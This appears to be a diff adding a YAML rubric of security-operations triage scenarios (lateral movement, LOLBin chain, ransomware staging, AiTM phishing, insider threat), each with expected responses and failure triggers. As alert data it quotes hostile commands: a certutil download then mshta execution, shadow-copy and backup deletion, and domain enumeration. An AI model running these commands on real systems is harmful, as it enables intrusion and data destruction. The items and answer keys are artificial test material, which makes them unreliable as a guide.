@@ -1,0 +1,324 @@
+intensity: standard
+
+# Standard rubric weights — completeness weighted higher than light
+# because multi-signal scenarios require full coverage to be correct.
+default_rubric:
+  accuracy:        0.25
+  appropriateness: 0.25
+  completeness:    0.25
+  safety:          0.15
+  compliance:      0.10
+
+scenarios:
+  - title: "Multi-Signal Lateral Movement"
+    category: Lateral Movement
+    description: >
+      Four low-to-medium alerts from different systems that individually appear routine
+      but together indicate active lateral movement across the internal network.
+      Requires correlation across sources — a single-alert view misses the pattern.
+    prompt: |
+      You have four alerts firing within a 22-minute window. Assess them together.
+
+      ALERT 1 [LOW] 08:41 UTC — Authentication
+      User svc-backup successfully authenticated to DC01 from WORKSTATION-14.
+      Note: svc-backup normally authenticates only from BACKUP-SRV.
+
+      ALERT 2 [LOW] 08:49 UTC — Process Execution
+      WORKSTATION-14: cmd.exe spawned by svchost.exe. Command:
+      net user /domain | net group "Domain Admins" /domain
+
+      ALERT 3 [MEDIUM] 08:57 UTC — Network
+      WORKSTATION-14 → DC01: SMB session opened. 14 files accessed in 8 minutes
+      across \\DC01\SYSVOL and \\DC01\NETLOGON shares.
+
+      ALERT 4 [LOW] 09:03 UTC — Authentication
+      Three failed RDP attempts from WORKSTATION-14 to FINANCE-SRV-01, then one success
+      using credentials for finance_admin (account normally used only at FINANCE-SRV-01).
+
+      Provide a unified assessment of these alerts.
+    expected_behaviors:
+      - Correlates all four alerts into a single lateral movement incident
+      - "Identifies the progression: credential misuse → enumeration → SMB access → RDP pivot"
+      - Flags svc-backup authentication from wrong host as likely credential theft
+      - Identifies the domain enumeration commands (net user, net group) as attacker recon
+      - Recognizes SYSVOL/NETLOGON access as consistent with GPO/script harvesting
+      - Flags finance_admin account use from WORKSTATION-14 as pass-the-hash or credential reuse
+      - Recommends immediate isolation of WORKSTATION-14
+      - Recommends locking svc-backup and finance_admin pending investigation
+      - Escalates as active incident — not a monitoring situation
+    critical_failure_triggers:
+      - "Treats each alert independently without correlating them"
+      - "Classifies as low severity based on individual alert ratings"
+      - "Recommends continued monitoring without isolation"
+      - "Misses the credential misuse pattern across service and admin accounts"
+
+  - title: "Living off the Land — LOLBin Chain"
+    category: Defense Evasion / Execution
+    description: >
+      An attacker using legitimate Windows binaries (LOLBins) to execute a payload.
+      No malware signatures fire. Requires behavioral pattern recognition.
+    prompt: |
+      ALERT [MEDIUM]: Unusual process chain detected on LAPTOP-HR-09 (Windows 11).
+      User: carol.nguyen@company.com (HR Generalist)
+      Time: 14:17–14:23 UTC
+
+      Process tree:
+      outlook.exe
+        └─ winword.exe (opened: Salary_Review_2025.docx)
+              └─ cmd.exe
+                    └─ certutil.exe -urlcache -split -f http://185.220.101.47/p.txt C:\Users\carol\AppData\Roaming\p.txt
+                          └─ mshta.exe C:\Users\carol\AppData\Roaming\p.txt
+
+      No AV alert fired. No known malicious hash. EDR flagged the chain as "suspicious."
+      carol.nguyen has not reported any issue.
+      185.220.101.47 — uncategorized, no prior hits in threat intel.
+      p.txt file: present on disk, 48KB.
+
+      Assess and recommend response.
+    expected_behaviors:
+      - Identifies this as a LOLBin attack chain — certutil used for payload download, mshta for execution
+      - Recognizes the document → cmd → certutil → mshta chain as a classic macro-based dropper
+      - Notes the absence of AV alert does not mean safe — LOLBins evade signature detection by design
+      - Recommends immediate isolation of LAPTOP-HR-09
+      - Recommends preserving p.txt for forensic analysis before removal
+      - Recommends checking for persistence mechanisms (scheduled tasks, registry run keys)
+      - Recommends reviewing outbound connections from the host after 14:17 UTC
+      - Recommends notifying Carol Nguyen and checking if she opened the document intentionally
+      - Flags 185.220.101.47 for threat intelligence enrichment and blocking
+    critical_failure_triggers:
+      - "Marks as low risk because no AV alert fired"
+      - "Does not identify certutil and mshta as LOLBin abuse"
+      - "Recommends deleting p.txt without forensic preservation"
+      - "Recommends no isolation because the tools are legitimate Windows binaries"
+
+  - title: "SaaS Data Exfiltration"
+    category: Exfiltration
+    description: >
+      A departing employee uploads large volumes of data to personal cloud storage
+      using authorized tools. The activity is technically permitted by current DLP policy
+      but the context makes it a clear exfiltration risk.
+    prompt: |
+      ALERT [MEDIUM]: Anomalous cloud upload volume detected.
+      Time: 16:04–17:51 UTC (today)
+      User: derek.morrison@company.com (Senior Product Designer)
+      Application: Google Drive (personal account — drive.google.com)
+      Data uploaded: 4.7 GB across 1,840 files
+      File types: .fig, .sketch, .pdf, .ai, .mp4, .zip
+      Baseline: Derek uploads ~200MB/week to Google Drive on average.
+
+      Context flags:
+      - Derek submitted his resignation letter 3 days ago. Last day is Friday.
+      - His manager filed a ticket yesterday requesting his access be revoked at EOD Friday.
+      - Current DLP policy allows personal cloud uploads up to 10GB/session.
+      - No policy currently restricts access by employees with active resignations.
+
+      How do you assess and respond?
+    expected_behaviors:
+      - Classifies this as a high-risk data exfiltration event despite technical policy compliance
+      - Identifies the combination of resignation + large upload volume + design file types as a clear exfiltration signal
+      - Recognizes the DLP policy gap — policy allows it, but intent is clearly exfiltration
+      - Recommends escalating to legal, HR, and Derek's manager immediately
+      - Recommends preserving logs of exactly what was uploaded for potential legal action
+      - Recommends restricting Derek's access now rather than waiting until Friday
+      - Does not simply close the alert as a policy-compliant action
+    critical_failure_triggers:
+      - "Closes the alert as a false positive because DLP policy permits the upload volume"
+      - "Takes no action because the employee is leaving anyway"
+      - "Does not flag the resignation context as relevant"
+      - "Recommends waiting until Friday to review"
+
+  - title: "Supply Chain Compromise — Trusted Software Beaconing"
+    category: Supply Chain / C2
+    description: >
+      A legitimate, IT-approved third-party software agent is exhibiting C2 beaconing behavior.
+      The software is trusted and whitelisted, making this a supply chain compromise scenario.
+    prompt: |
+      ALERT [MEDIUM]: Anomalous outbound traffic from a whitelisted application.
+      Time: Ongoing — first detected 02:11 UTC, still active
+      Host: multiple — seen on 34 endpoints across engineering and finance departments
+      Process: MonitoringAgent.exe (v3.4.1) — approved IT monitoring tool by Acme Monitoring Corp
+      Destination: 103.91.92.14 (not Acme Monitoring Corp's documented IP ranges)
+      Traffic pattern: HTTPS beacon every 300 seconds, consistent payload size (~4.2KB outbound)
+      Acme's documented endpoints: 52.14.x.x (AWS us-east-1) — none match 103.91.92.14
+
+      MonitoringAgent.exe hash: matches known-good hash in your asset database.
+      Certificate on 103.91.92.14: self-signed, CN=acme-monitoring-update[.]com (registered 11 days ago)
+
+      Acme Monitoring Corp's status page: no incidents reported.
+      Acme support has not responded to your call placed 20 minutes ago.
+
+      What is your assessment?
+    expected_behaviors:
+      - Identifies this as a probable supply chain compromise or hijacked update mechanism
+      - Notes the destination IP does not match Acme's documented infrastructure
+      - Flags the self-signed certificate on a recently registered lookalike domain as a strong indicator
+      - Notes that a valid hash does not rule out compromise — supply chain attacks use signed binaries
+      - Recommends blocking 103.91.92.14 at the perimeter immediately
+      - Recommends isolating or suspending MonitoringAgent.exe on affected endpoints pending investigation
+      - Recommends contacting Acme through a verified out-of-band channel (not a number from their software)
+      - Escalates as a potential multi-host incident affecting 34 endpoints
+      - Does not dismiss because the binary hash is valid
+    critical_failure_triggers:
+      - "Dismisses the alert because the software is whitelisted and the hash is valid"
+      - "Waits for Acme to respond before taking any action"
+      - "Does not flag the destination IP mismatch as significant"
+      - "Recommends no network-level blocking"
+
+  - title: "Ransomware Pre-Encryption Indicators"
+    category: Ransomware
+    description: >
+      A cluster of alerts showing pre-encryption ransomware behavior: shadow copy deletion,
+      backup access, and small test-encryption files. The ransomware has not yet encrypted
+      production data. Speed of response determines blast radius.
+    prompt: |
+      Three alerts fired in the last 8 minutes on FILE-SRV-02 (primary file server, 12TB storage).
+
+      ALERT 1 [HIGH] 03:44 UTC
+      vssadmin.exe delete shadows /all /quiet — executed by SYSTEM
+      wbadmin delete catalog -quiet — executed by SYSTEM
+      bcdedit /set {default} recoveryenabled No
+
+      ALERT 2 [MEDIUM] 03:47 UTC
+      Unusual process (svchost32.exe — note: not legitimate svchost.exe) accessed
+      the backup share \\BACKUP-SRV\FileServerBackup with read permissions.
+      22 backup files opened in 3 minutes.
+
+      ALERT 3 [MEDIUM] 03:51 UTC
+      File creation spike on FILE-SRV-02:
+      18 files with extension .enc_test created in C:\Temp\ — all 0-byte placeholder files.
+      File naming pattern: DECRYPT_INSTRUCTIONS_[random].txt created in same directory.
+
+      Current time: 03:52 UTC. No user activity expected at this hour.
+
+      What do you do?
+    expected_behaviors:
+      - Identifies this as active ransomware pre-encryption staging — imminent threat
+      - Recognizes shadow copy deletion + backup access + test encryption files as the ransomware kill chain
+      - Recommends immediate isolation of FILE-SRV-02 from the network — production data not yet encrypted
+      - Recommends isolation of BACKUP-SRV to protect backup integrity
+      - Recommends killing svchost32.exe immediately
+      - Escalates to incident response team and senior leadership immediately given 03:52 UTC timing
+      - Recommends preserving memory dump and disk image before any remediation
+      - Notes the 8-minute window — urgency is critical, blast radius grows with every minute
+    critical_failure_triggers:
+      - "Recommends monitoring without immediate isolation"
+      - "Does not recognize this as imminent ransomware"
+      - "Recommends waiting until business hours to escalate"
+      - "Fails to flag backup server as also at risk"
+      - "Recommends rebooting FILE-SRV-02 as a first step"
+
+  - title: "AiTM Phishing — MFA Bypass"
+    category: Credential Theft / MFA Bypass
+    description: >
+      An adversary-in-the-middle phishing attack that successfully harvested a session token,
+      bypassing MFA. The user believes they authenticated normally. Standard phishing indicators
+      are absent — requires understanding of modern AiTM techniques.
+    prompt: |
+      ALERT [HIGH]: Impossible travel / session anomaly.
+      Time: 11:32 UTC
+
+      User: priya.sharma@company.com (Finance VP)
+      Event: Successful Microsoft 365 login
+      Location: Frankfurt, Germany (IP: 194.165.16.72)
+      Previous login: San Francisco, CA (IP: 136.24.11.201) — 14 minutes earlier
+
+      MFA: Completed (Microsoft Authenticator push — approved)
+      Device: Unknown device, not enrolled in MDM
+      Session token age: 0 minutes (new session, not a token replay from SF)
+
+      Additional context:
+      - Priya is currently in the San Francisco office — confirmed by badge swipe 11:18 UTC
+      - The Frankfurt login used a valid session cookie, not just credentials
+      - Priya has not reported anything unusual
+      - No phishing email was caught by email gateway
+
+      What happened and what do you do?
+    expected_behaviors:
+      - Identifies this as an AiTM (adversary-in-the-middle) phishing attack
+      - Explains that AiTM proxies capture the session cookie after MFA completion, bypassing MFA
+      - Notes that MFA being "completed" does not mean the login is legitimate in AiTM attacks
+      - Recommends immediately revoking all active sessions for Priya's account
+      - Recommends resetting Priya's credentials
+      - Recommends contacting Priya to check if she clicked any unusual links recently
+      - Recommends reviewing all actions taken in the Frankfurt session
+      - Recommends checking for mailbox rules, forwarding, or OAuth app consents added in the session
+      - Notes the absence of a caught phishing email does not rule out phishing
+    critical_failure_triggers:
+      - "Dismisses as false positive because MFA was completed"
+      - "Does not identify AiTM as the likely attack vector"
+      - "Does not recommend revoking Priya's active sessions immediately"
+      - "Treats this as a simple impossible travel alert without recognizing session cookie theft"
+
+  - title: "Authorized Pentest or Active Attack?"
+    category: Alert Triage / False Positive
+    description: >
+      A cluster of attack-pattern alerts that may be authorized penetration testing.
+      The analyst must verify authorization before responding — but cannot delay if it is real.
+      Tests the ability to triage with appropriate urgency while verifying scope.
+    prompt: |
+      ALERT [HIGH] 09:22 UTC: Multiple attack-pattern alerts on CORP-NET segment.
+
+      - Nmap SYN scan from 10.10.50.100 across 10.0.0.0/16 — 15,000 probes in 4 minutes
+      - SMB vulnerability probe (EternalBlue pattern) from 10.10.50.100 → 10.0.1.0/24
+      - Mimikatz-like LSASS memory access attempt on WORKSTATION-22 from 10.10.50.100
+      - BloodHound-pattern LDAP queries against DC01 from 10.10.50.100
+
+      10.10.50.100 is assigned to "PenTest-Kali-01" in your asset inventory.
+      Asset tag comment: "Pentest VM — authorized use only."
+
+      You have no record of an active pentest engagement this week.
+      The CISO has not replied to your Slack message sent 3 minutes ago.
+      The security calendar shows no scheduled pentest for today.
+
+      What do you do?
+    expected_behaviors:
+      - Does not immediately dismiss as authorized pentest without verification
+      - Does not immediately treat as confirmed attack without attempting to verify
+      - Recognizes that pentest VMs can be compromised and used by actual attackers
+      - Escalates urgently to verify pentest authorization through a second channel (phone call, not just Slack)
+      - Attempts to contact the pentest team lead or CISO via phone given urgency
+      - Implements temporary containment (network isolation of 10.10.50.100) while verification is in progress
+      - Documents the decision to contain pending verification
+      - Does not wait passively for CISO to respond before taking any action
+    critical_failure_triggers:
+      - "Closes alerts as authorized pentest without any verification"
+      - "Takes no containment action while waiting for CISO response"
+      - "Dismisses the possibility that the pentest VM could be compromised"
+
+  - title: "Insider Threat — Privileged Admin After Hours"
+    category: Insider Threat
+    description: >
+      A senior IT administrator performs a series of actions at 2am that individually
+      have legitimate explanations but collectively suggest data theft or sabotage preparation.
+    prompt: |
+      ALERT cluster: Unusual privileged activity — after hours.
+      Time: 02:14–03:06 UTC (Saturday night / Sunday morning)
+      User: tom.hayes@company.com (Senior Systems Administrator, 6 years tenure)
+
+      02:14 — VPN login from Tom's home IP (consistent with his known home address)
+      02:17 — Accessed HR system (PeopleSoft) — viewed 847 employee records including salary fields
+      02:31 — Exported employee directory to CSV from PeopleSoft (full export, 2,200 rows)
+      02:38 — Accessed source code repository — cloned 3 production repos he is not listed as a maintainer on
+      02:44 — Queried customer database: SELECT * FROM customers LIMIT 50000 — exported to local CSV
+      02:59 — Accessed payroll vendor portal (ADP) with his admin credentials
+      03:06 — VPN session ended
+
+      Tom's normal working hours: Mon–Fri, 08:00–18:00 local time.
+      Tom has not submitted any after-hours change requests or on-call tickets tonight.
+      No incidents or outages are active that would require his involvement.
+
+      How do you assess this?
+    expected_behaviors:
+      - Classifies this as a high-severity insider threat incident
+      - "Notes the breadth of data accessed: HR records, salaries, source code, customer data, payroll"
+      - Identifies that no operational justification exists for this activity
+      - Recommends suspending Tom's access immediately pending investigation
+      - Recommends preserving all logs and exports for legal/HR
+      - Recommends notifying CISO, legal counsel, and HR
+      - Recommends forensic review of what data was accessed and whether it was exfiltrated externally
+      - Notes that long tenure does not reduce the risk — insider threats are often trusted employees
+    critical_failure_triggers:
+      - "Attributes activity to routine admin work without investigating"
+      - "Does not recommend suspending access pending investigation"
+      - "Treats each action independently rather than as a pattern"
+      - "Delays escalation to HR and legal"
